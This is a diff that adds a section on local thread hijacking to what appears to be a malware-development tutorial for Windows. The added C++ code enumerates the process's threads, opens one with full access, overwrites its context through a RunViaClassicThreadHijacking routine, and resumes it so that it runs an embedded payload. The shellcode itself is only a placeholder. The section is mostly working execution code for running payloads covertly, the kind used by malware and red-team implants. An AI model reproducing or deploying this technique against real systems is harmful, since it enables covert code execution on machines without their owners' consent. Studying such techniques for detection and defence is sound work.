@@ -228,3 +228,90 @@ int main(int argc, char *argv[]) {
 
 const unsigned char EncodedPayload[] = {0x00}; // 0x00007FF7681760A0
 ```
+
+**Local thread highjacking with thread-enumeration**
+
+In real scenarios, we may want to hijack an existing thread within our process. Hence enumeration to select the one to hijack.
+
+```cpp
+#include <tlhelp32.h>
+
+bool GetLocalThreadHandle(DWORD dwMainThreadId, DWORD &dwThreadId, HANDLE &hThread) {
+    dwThreadId = 0;
+    hThread = NULL;
+
+    DWORD dwProcessId = GetCurrentProcessId();
+
+    THREADENTRY32 thr{};
+    thr.dwSize = sizeof(thr);
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        std::cerr << "[!] CreateToolhelp32Snapshot Failed With Error : " << GetLastError() << '\n';
+        return false;
+    }
+
+    if (!Thread32First(hSnapshot, &thr)) {
+        std::cerr << "[!] Thread32First Failed With Error : " << GetLastError() << '\n';
+        CloseHandle(hSnapshot);
+        return false;
+    }
+
+    do {
+        // Skip threads from other processes and the main thread
+        if (thr.th32OwnerProcessID == dwProcessId && thr.th32ThreadID != dwMainThreadId) {
+            dwThreadId = thr.th32ThreadID;
+            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thr.th32ThreadID);
+            if (hThread == NULL) {
+                std::cerr << "[!] OpenThread Failed With Error : " << GetLastError() << '\n';
+            }
+            break;
+        }
+    } while (Thread32Next(hSnapshot, &thr));
+
+    CloseHandle(hSnapshot);
+
+    if (dwThreadId == 0 || hThread == NULL)
+        return false;
+
+    return true;
+}
+
+// ... other code remains the same here ...
+
+int main() {
+	HANDLE hThread = nullptr;
+	DWORD dwMainThreadId = GetCurrentThreadId();
+	DWORD dwTargetThreadId = 0;
+
+	// Get a handle to a target thread within the same process
+	if (!GetLocalThreadHandle(dwMainThreadId, dwTargetThreadId, hThread)) {
+		std::cerr << "[!] Failed to get local thread handle\n";
+		return EXIT_FAILURE;
+	}
+
+	std::cout << "[#] Target Thread ID: " << dwTargetThreadId << '\n';
+
+	// Hijack the target thread
+	if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
+		std::cerr << "[!] Thread hijack failed\n";
+		CloseHandle(hThread);
+		return EXIT_FAILURE;
+	}
+
+	// Resume the target thread so it executes our payload
+	if (ResumeThread(hThread) == (DWORD)-1) {
+		std::cerr << "[!] ResumeThread Failed With Error : " << GetLastError() << '\n';
+		CloseHandle(hThread);
+		return EXIT_FAILURE;
+	}
+
+	std::cout << "[#] Press <Enter> To Quit ... ";
+	std::cin.get();
+
+	CloseHandle(hThread);
+	return EXIT_SUCCESS;
+}
+```
+
+Similar as with process enumeration, first we can print the threadIDs and then select one.
